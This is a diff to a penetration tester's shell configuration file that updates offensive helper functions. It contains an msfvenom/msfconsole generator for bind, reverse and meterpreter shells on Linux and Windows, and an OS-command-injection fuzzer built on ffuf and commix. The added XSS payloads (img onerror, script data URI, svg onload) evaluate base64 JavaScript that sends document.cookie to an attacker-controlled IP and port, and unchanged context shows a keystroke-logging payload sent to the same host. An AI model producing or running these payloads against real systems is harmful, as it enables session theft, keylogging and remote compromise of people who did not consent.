@@ -5,6 +5,8 @@ alias gettgtpkinit.py="/home/damuna/tools/PKINITtools/venv/bin/python3 /home/dam
 alias getnthash.py="/home/damuna/tools/PKINITtools/venv/bin/python3 /home/damuna/tools/PKINITtools/getnthash.py"
 alias pygpoabuse="/home/damuna/tools/pyGPOAbuse/venv/bin/python3 /home/damuna/tools/pyGPOAbuse/pygpoabuse.py"
 alias randstr="openssl rand -hex 12"
+alias droopescan="/home/damuna/tools/droopescan/droopescan"
+
 # TTY upgrade
 tty(){
     echo "script -qc /bin/bash /dev/null \n python3 -c 'import pty; pty.spawn(\"/bin/bash\")' \n CTRL+Z -> stty raw -echo; fg -> reset -> export TERM=xterm \n xterm for teminal type"
@@ -1109,7 +1111,7 @@ ligstart(){
     cp ~/tools/LIGOLO_AGENTS/agent.exe .
 
     echo -e "\n[+] OPENING LIGOLO PROXY ON \"$ip:$port\"\n"
-    echo -e "- ./agent -connect $ip:$port -ignore-cert"
+    echo -e "\t./agent -connect $ip:$port -ignore-cert\n"
     ligcreate ligolo >/dev/null
     sudo ligolo-proxy -selfcert -nobanner -laddr "$ip:$port"
     cd ..
@@ -1311,19 +1313,21 @@ dnsrec(){
 
 # Default credentials for services / applications
 searchpass(){
-    sudo pass-station search $1
+    pass-station search $1
 }
 
 # MSF Listener / Binder Generator
 # MSF Listener / Binder Generator
+# MSF Listener / Binder Generator
 metash(){
+    echo -e "\n[+] SELECT LISTENER INTERFACE\n"
     chnic
-    read -r os\?"SELECT OS (win32 / win64 / lin32 / lin64): "
+    read -r os\?"[+] SELECT OS (win32 / win64 / lin32 / lin64): "
     if [[ $os =~ ^lin* ]]; then
-        read -r form\?"SELECT FORMAT (elf, elf-so): "
+        read -r form\?"[+] SELECT FORMAT (elf, elf-so): "
     fi
     if [[ $os =~ ^win* ]]; then
-        read -r form\?"SELECT FORMAT (exe, ps1, msi, dll, asp, aspx, hta, vba, vbs): "
+        read -r form\?"[+] SELECT FORMAT (exe, ps1, msi, dll, asp, aspx, hta, vba, vbs): "
     fi
 
     ext_form=$form
@@ -1332,60 +1336,60 @@ metash(){
         ext_form="ps1"
     fi
 
-    read -r type\?"SELECT STAGING: (staged / stageless): "
+    read -r type\?"[+] SELECT STAGING: (staged / stageless): "
     if [[ $type == "stageless" ]]; then
-        read -r lis\?"SELECT CONNECTION (bind / reverse): "
+        read -r lis\?"[+] SELECT CONNECTION (bind / reverse): "
     fi
 
     if [[ $type == "staged" ]]; then
-        read -r lis\?"SELECT CONNECTION (bind / reverse / meterpreter): "
+        read -r lis\?"[+] SELECT CONNECTION (bind / reverse / meterpreter): "
     fi
 
-    read -r lhost\?"INPUT LHOST IP/NIC: "
-    read -r port\?"INPUT LPORT: "
+    read -r lhost\?"[+] INPUT PAYLOAD IP/NIC: "
+    read -r port\?"[+] INPUT PAYLOAD PORT: "
 
     if [[ $os =~ ^lin* ]]; then
         if [[ $os == "lin32" ]]; then
             if [[ $type == "staged" ]]; then
                 if [[ $lis == "bind" ]]; then
-                    echo -e "\nGENERATING SHELL\n"
+                    echo -e "\n[+] GENERATING SHELL\n"
                     msfvenom --smallest -p linux/x86/shell/bind_tcp -f $form LHOST=$lhost LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form
 
-                    read -r target\?"INPUT TARGET IP AFTER SHELL EXECUTION: "
+                    read -r target\?"[+] INPUT TARGET IP AFTER SHELL EXECUTION: "
                     msfconsole -q -x "use exploit/multi/handler; set payload linux/x86/shell/bind_tcp; set RHOST $target; set LPORT $atk_port; run;"
                 fi
 
                 if [[ $lis == "reverse" ]]; then
-                    echo -e "\nGENERATING SHELL\n"
+                    echo -e "\n[+] GENERATING SHELL\n"
                     msfvenom --smallest -p linux/x86/shell/reverse_tcp -f $form LHOST=$lhost LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form
 
-                    echo -e "\nOPENING HANDLER\n"
+                    echo -e "\n[+] OPENING HANDLER\n"
                     msfconsole -q -x "use exploit/multi/handler; set payload linux/x86/shell/reverse_tcp; set LHOST $nic; set LPORT $port; run;"
                 fi
 
                 if [[ $lis == "meterpreter" ]]; then
-                    echo -e "\nGENERATING SHELL\n"
+                    echo -e "\n[+] GENERATING SHELL\n"
                     msfvenom --smallest -p linux/x86/meterpreter/reverse_tcp -f $form LHOST=$lhost LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form
 
-                    echo -e "\nOPENING HANDLER\n"
+                    echo -e "\n[+] OPENING HANDLER\n"
                     msfconsole -q -x "use exploit/multi/handler; set payload linux/x86/meterpreter/reverse_tcp; set LHOST $nic; set LPORT $port; run;"
                 fi
             fi
 
             if [[ $type == "stageless" ]]; then 
                 if [[ $lis == "bind" ]]; then
-                    echo -e "\nGENERATING SHELL\n"
+                    echo -e "\n[+] GENERATING SHELL\n"
                     msfvenom --smallest -p linux/x86/shell_bind_tcp -f $form LHOST=$lhost LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form
 
-                    read -r target\?"INPUT TARGET IP AFTER SHELL EXECUTION: "
+                    read -r target\?"[+] INPUT TARGET IP AFTER SHELL EXECUTION: "
                     msfconsole -q -x "use exploit/multi/handler; set payload linux/x86/shell_bind_tcp; set RHOST $target; set LPORT $atk_port; run;"
                 fi
 
                 if [[ $lis == "reverse" ]]; then
-                    echo -e "\nGENERATING SHELL\n"
+                    echo -e "\n[+] GENERATING SHELL\n"
                     msfvenom --smallest -p linux/x86/shell_reverse_tcp -f $form LHOST=$lhost LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form
 
-                    echo -e "\nOPENING HANDLER\n"
+                    echo -e "\n[+] OPENING HANDLER\n"
                     msfconsole -q -x "use exploit/multi/handler; set payload linux/x86/shell_reverse_tcp; set LHOST $nic; set LPORT $port; run;"
                 fi
             fi
@@ -1393,43 +1397,43 @@ metash(){
         if [[ $os == "lin64" ]]; then
             if [[ $type == "staged" ]]; then
                 if [[ $lis == "bind" ]]; then
-                    echo -e "\nGENERATING SHELL\n"
+                    echo -e "\n[+] GENERATING SHELL\n"
                     msfvenom --smallest -p linux/x64/shell/bind_tcp -f $form LHOST=$lhost LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form
 
-                    read -r target\?"INPUT TARGET IP AFTER SHELL EXECUTION: "
+                    read -r target\?"[+] INPUT TARGET IP AFTER SHELL EXECUTION: "
                     msfconsole -q -x "use exploit/multi/handler; set payload linux/x64/shell/bind_tcp; set RHOST $target; set LPORT $atk_port; run;"
                 fi
 
                 if [[ $lis == "reverse" ]]; then
-                    echo -e "\nGENERATING SHELL\n"
+                    echo -e "\n[+] GENERATING SHELL\n"
                     msfvenom --smallest -p linux/x64/shell/reverse_tcp -f $form LHOST=$lhost LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form
 
-                    echo -e "\nOPENING HANDLER\n"
+                    echo -e "\n[+] OPENING HANDLER\n"
                     msfconsole -q -x "use exploit/multi/handler; set payload linux/x64/shell/reverse_tcp; set LHOST $nic; set LPORT $port; run;"
                 fi
 
                 if [[ $lis == "meterpreter" ]]; then
-                    echo -e "\nGENERATING SHELL\n"
+                    echo -e "\n[+] GENERATING SHELL\n"
                     msfvenom --smallest -p linux/x64/meterpreter/reverse_tcp -f $form LHOST=$lhost LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form
 
-                    echo -e "\nOPENING HANDLER\n"
+                    echo -e "\n[+] OPENING HANDLER\n"
                     msfconsole -q -x "use exploit/multi/handler; set payload linux/x64/meterpreter/reverse_tcp; set LHOST $nic; set LPORT $port; run;"
                 fi
             fi
             if [[ $type == "stageless" ]]; then
                 if [[ $lis == "bind" ]]; then
-                    echo -e "\nGENERATING SHELL\n"
+                    echo -e "\n[+] GENERATING SHELL\n"
                     msfvenom --smallest -p linux/x64/shell_bind_tcp -f $form LHOST=$lhost LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form
 
-                    read -r target\?"INPUT TARGET IP AFTER SHELL EXECUTION: "
+                    read -r target\?"[+] INPUT TARGET IP AFTER SHELL EXECUTION: "
                     msfconsole -q -x "use exploit/multi/handler; set payload linux/x64/shell_bind_tcp; set RHOST $target; set LPORT $atk_port; run;"
                 fi
 
                 if [[ $lis == "reverse" ]]; then
-                    echo -e "\nGENERATING SHELL\n"
+                    echo -e "\n[+] GENERATING SHELL\n"
                     msfvenom --smallest -p linux/x64/shell_reverse_tcp -f $form LHOST=$lhost LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form
 
-                    echo -e "\nOPENING HANDLER\n"
+                    echo -e "\n[+] OPENING HANDLER\n"
                     msfconsole -q -x "use exploit/multi/handler; set payload linux/x64/shell_reverse_tcp; set LHOST $nic; set LPORT $port; run;"
                 fi
             fi
@@ -1440,43 +1444,43 @@ metash(){
         if [[ $os == "win64" ]]; then
             if [[ $type == "staged" ]]; then
                 if [[ $lis == "bind" ]]; then
-                    echo -e "\nGENERATING SHELL\n"
+                    echo -e "\n[+] GENERATING SHELL\n"
                     msfvenom --smallest -p windows/x64/shell/bind_tcp -f $form LHOST=$lhost LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form
 
-                    read -r target\?"INPUT TARGET IP AFTER SHELL EXECUTION: "
+                    read -r target\?"[+] INPUT TARGET IP AFTER SHELL EXECUTION: "
                     msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/shell/bind_tcp; set RHOST $target; set LPORT $atk_port; run;"
                 fi
 
                 if [[ $lis == "reverse" ]]; then
-                    echo -e "\nGENERATING SHELL\n"
+                    echo -e "\n[+] GENERATING SHELL\n"
                     msfvenom --smallest -p windows/x64/shell/reverse_tcp -f $form LHOST=$lhost LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form
 
-                    echo -e "\nOPENING HANDLER\n"
+                    echo -e "\n[+] OPENING HANDLER\n"
                     msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/shell/reverse_tcp; set LHOST $nic; set LPORT $port; run;"
                 fi
 
                 if [[ $lis == "meterpreter" ]]; then
-                    echo -e "\nGENERATING SHELL\n"
+                    echo -e "\n[+] GENERATING SHELL\n"
                     msfvenom --smallest -p windows/x64/meterpreter/reverse_tcp -f $form LHOST=$lhost LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form
 
-                    echo -e "\nOPENING HANDLER\n"
+                    echo -e "\n[+] OPENING HANDLER\n"
                     msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST $nic; set LPORT $port; run;"
                 fi
             fi
             if [[ $type == "stageless" ]]; then
                 if [[ $lis == "bind" ]]; then
-                    echo -e "\nGENERATING SHELL\n"
+                    echo -e "\n[+] GENERATING SHELL\n"
                     msfvenom --smallest -p windows/x64/shell_bind_tcp -f $form LHOST=$lhost LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form
 
-                    read -r target\?"INPUT TARGET IP AFTER SHELL EXECUTION: "
+                    read -r target\?"[+] INPUT TARGET IP AFTER SHELL EXECUTION: "
                     msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/shell_bind_tcp; set RHOST $target; set LPORT $atk_port; run;"
                 fi
 
                 if [[ $lis == "reverse" ]]; then
-                    echo -e "\nGENERATING SHELL\n"
+                    echo -e "\n[+] GENERATING SHELL\n"
                     msfvenom --smallest -p windows/x64/shell_reverse_tcp -f $form LHOST=$lhost LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form
 
-                    echo -e "\nOPENING HANDLER\n"
+                    echo -e "\n[+] OPENING HANDLER\n"
                     msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/shell_reverse_tcp; set LHOST $nic; set LPORT $port; run;"
                 fi
             fi
@@ -1484,43 +1488,43 @@ metash(){
         if [[ $os == "win32" ]]; then
             if [[ $type == "staged" ]]; then
                 if [[ $lis == "bind" ]]; then
-                    echo -e "\nGENERATING SHELL\n"
+                    echo -e "\n[+] GENERATING SHELL\n"
                     msfvenom -a x86 -p windows/shell/bind_tcp -f $form LHOST=$lhost LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form
 
-                    read -r target\?"INPUT TARGET IP AFTER SHELL EXECUTION: "
+                    read -r target\?"[+] INPUT TARGET IP AFTER SHELL EXECUTION: "
                     msfconsole -q -x "use exploit/multi/handler; set payload windows/x86/shell/bind_tcp; set RHOST $target; set LPORT $atk_port; run;"
                 fi
 
                 if [[ $lis == "reverse" ]]; then
-                    echo -e "\nGENERATING SHELL\n"
+                    echo -e "\n[+] GENERATING SHELL\n"
                     msfvenom -a x86 -p windows/shell/reverse_tcp -f $form LHOST=$lhost LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form
 
-                    echo -e "\nOPENING HANDLER\n"
+                    echo -e "\n[+] OPENING HANDLER\n"
                     msfconsole -q -x "use exploit/multi/handler; set payload windows/shell/reverse_tcp; set LHOST $nic; set LPORT $port; run;"
                 fi
 
                 if [[ $lis == "meterpreter" ]]; then
-                    echo -e "\nGENERATING SHELL\n"
+                    echo -e "\n[+] GENERATING SHELL\n"
                     msfvenom -a x86 -p windows/meterpreter/reverse_tcp -f $form LHOST=$lhost LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form
 
-                    echo -e "\nOPENING HANDLER\n"
+                    echo -e "\n[+] OPENING HANDLER\n"
                     msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST $nic; set LPORT $port; run;"
                 fi
             fi
             if [[ $type == "stageless" ]]; then
                 if [[ $lis == "bind" ]]; then
-                    echo -e "\nGENERATING SHELL\n"
+                    echo -e "\n[+] GENERATING SHELL\n"
                     msfvenom -a x86 -p windows/shell_bind_tcp -f $form LHOST=$lhost LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form
 
-                    read -r target\?"INPUT TARGET IP AFTER SHELL EXECUTION: "
+                    read -r target\?"[+] INPUT TARGET IP AFTER SHELL EXECUTION: "
                     msfconsole -q -x "use exploit/multi/handler; set payload windows/shell_bind_tcp; set RHOST $target; set LPORT $atk_port; run;"
                 fi
 
                 if [[ $lis == "reverse" ]]; then
-                    echo -e "\nGENERATING SHELL\n"
+                    echo -e "\n[+] GENERATING SHELL\n"
                     msfvenom -a x86 -p windows/shell_reverse_tcp -f $form LHOST=$lhost LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form
 
-                    echo -e "\nOPENING HANDLER\n"
+                    echo -e "\n[+] OPENING HANDLER\n"
                     msfconsole -q -x "use exploit/multi/handler; set payload windows/shell_reverse_tcp; set LHOST $nic; set LPORT $port; run;"
                 fi
             fi
@@ -1708,15 +1712,11 @@ urlgen(){
 alias bashfuscator='source ~/tools/bashfuscator-env/bin/activate && bashfuscator'
 
 
-# OS Injection Request Scanner
+# OS Injection Linux Fuzzer
 osscan(){
-    if [[ $# -eq 0 ]]; then
-        echo "Usage: osscan <request_file> -> Add FUZZ to parameter to test"
-	return 1
-    fi
     rm ./os_injection.txt
-    read -r cmd\?"INPUT COMMAND TO EXECUTE: "
-    read -r regex\?"INPUT RESPONSE CONFIRMATION STRING (BLANK IF BLIND): "
+    read -r cmd\?"[+] INPUT COMMAND TO EXECUTE: "
+    read -r regex\?"[+] INPUT RESPONSE CONFIRMATION STRING (BLANK IF BLIND): "
 
     bin=$(echo "$cmd" | awk '{print $1}')
     echo "rev" | sed 's/./&$()/1' >> /tmp/rev_mangle.txt
@@ -1772,20 +1772,21 @@ osscan(){
     
     cat os_injection.txt | sort -u | shuf >t; mv t os_injection.txt
     if [[ ! -z $regex ]]; then
-        echo -e "\nFUZZING REQUEST \"$1\" AND MATCHING RESPONSE FOR \"$regex\""
+        echo -e "\n[+] FUZZING REQUEST \"$1\" AND MATCHING RESPONSE FOR \"$regex\""
         ffuf -r -request $1 --request-proto http -w os_injection.txt -s -mr $regex
     else
-        echo -e "\nFUZZING REQUEST \"$1\""
+        echo -e "\n[+] FUZZING REQUEST \"$1\""
         ffuf -r -request $1 --request-proto http -w os_injection.txt -s
     fi
 
-    echo -e "\nTESTING REQUEST \"$1\" FOR OS INJECTION USING COMMIX"
+    echo -e "\n[+] TESTING REQUEST \"$1\" FOR OS INJECTION USING COMMIX"
     cur=$(pwd)
-    cd ~/tools/commix
+    cd ~/TOOLS/commix
     python3 commix.py --update
     python3 commix.py -r $cur/$1 --flush-session --mobile --purge --current-user --level=3 --tamper=backslashes,backticks,base64encode,caret,dollaratsigns,doublequotes,multiplespaces,nested,printf2echo,randomcase,rev,singlequotes,slash2env,sleep2timeout,sleep2usleep,space2htab,space2ifs,space2plus,space2vtab
     cd $cur
 }
+
 
 # python virtual environment
 pyenv() {
@@ -1810,6 +1811,13 @@ pyenv() {
         echo -n "Enter script filename to run [default: main.py]: "
         read SCRIPT_NAME
         SCRIPT_NAME="${SCRIPT_NAME:-main.py}"
+        
+        # Check if the file exists
+        while [[ ! -f "./$SCRIPT_NAME" ]]; do
+            echo "Error: '$SCRIPT_NAME' not found in current folder."
+            echo -n "Enter script filename to run: "
+            read SCRIPT_NAME
+        done
 
         # Create alias in .zshrc
         echo "alias ${TOOL_NAME}='${PY_BIN} ${PROJECT_DIR}/${SCRIPT_NAME}'" >> ~/.zshrc
@@ -2292,7 +2300,10 @@ xssgen() {
     echo -e "\n[+] COOKIE STEALING\n"
     b64_cookie=$(echo "fetch('http://$ip:$lport/?cookie='+btoa(document.cookie));" | base64 -w0)
     echo "jaVasCript:/*-/*\`/*\\\\\`/*'/*\"/**/(/**/OnFOCus=\\\\u0065val(atob('$b64_cookie')) AuTOFOcus TabINDEx=1)//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--\!>\\\\x3cA/<A/oNFoCUs=\\\\u0065val(atob('$b64_cookie')) AuTOFocus TaBIndeX=1//>\\\\x3e"
-
+    echo -e "\n[+] SIMPLE PAYLOADS (Cookie Stealing):\n"
+    echo "<img/src=x/onerror=eval(atob('$b64_cookie'))>"
+    echo "<script/src=\"data:;base64,$b64_cookie\"></script>"
+    echo "<svg/onload=eval(atob(\"$b64_cookie\"));>"
     echo -e "\n[+] KEY LOGGING\n"
     b64_key=$(echo "document.onkeypress=e=>fetch('http://$ip:$lport/?keystroke='+e.key)" | base64 -w0)
     echo "jaVasCript:/*-/*\`/*\\\\\`/*'/*\"/**/(/**/OnFOCus=\\\\u0065val(atob('$b64_key')) AuTOFOcus TabINDEx=1)//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--\!>\\\\x3cA/<A/oNFoCUs=\\\\u0065val(atob('$b64_key')) AuTOFocus TaBIndeX=1//>\\\\x3e"
